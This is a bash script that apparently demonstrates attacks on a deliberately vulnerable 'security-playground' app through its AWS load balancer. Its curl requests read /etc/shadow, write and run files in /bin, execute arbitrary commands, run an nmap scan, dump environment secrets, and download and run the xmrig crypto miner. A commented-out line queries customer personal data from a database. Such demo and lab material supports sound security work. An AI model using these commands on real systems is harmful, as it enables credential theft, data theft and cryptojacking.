#!/bin/bash
# Script to demonstrate how to interact with security-playground

REGION="ap-southeast-4"
LB_ADDR=$(aws cloudformation list-exports --region $REGION --query "Exports[?Name=='SPALBAddress'].Value" --output text)

echo "1. Exploit reading our /etc/shadow file and sending it back to us"
curl $LB_ADDR/etc/shadow

echo "2. Exploit writing to /bin"
curl -X POST $LB_ADDR/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "and then set it to be executable"
curl -X POST $LB_ADDR/exec -d 'command=chmod 0755 /bin/hello'
echo "and then run it"
curl -X POST $LB_ADDR/exec -d 'command=hello'

echo "3. Exploit installing nmap and running a scan"
curl -X POST $LB_ADDR/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'

echo "4. Exploit retrieving our decrypted secrets"
curl -X POST $LB_ADDR/exec -d "command=/bin/sh -c 'set'"

echo "5. Install psql client"
curl -X POST $LB_ADDR/exec -d "command=apt-get install -y postgresql-client"
curl -X POST $LB_ADDR/exec -d "command=psql -V"

echo "6. Do a select against our database"
#curl -X POST $LB_ADDR/exec -d "command=psql Farga-postg-1XRIHLUCG30EF-28dd7c04dfce72d0.elb.ap-southeast-4.amazonaws.com -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'

echo "5. Exploit downloading then running a crypto miner"
curl -X POST $LB_ADDR/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'
curl -X POST $LB_ADDR/exec -d 'command=tar -xzvf xmrig.tar.gz'
curl -X POST $LB_ADDR/exec -d 'command=/app/xmrig-6.18.1/xmrig'